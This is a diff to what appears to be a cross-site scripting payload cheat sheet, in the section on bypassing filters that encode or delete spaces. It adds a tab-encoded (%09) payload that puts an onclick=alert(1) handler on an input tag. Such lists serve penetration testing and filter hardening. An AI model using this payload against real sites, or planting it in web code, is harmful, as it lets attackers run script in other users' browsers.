@@ -176,7 +176,8 @@ Try to use this payloads :
 
 ### 4.If space is encoded or deleted
 ```
-use tab ;)
+use tab url encode : %09
+<input%09value"XXXXXXX"%09onclick=alert(1)>Click</input>
 ```
 
 ### 5.If () is encoded or deleted
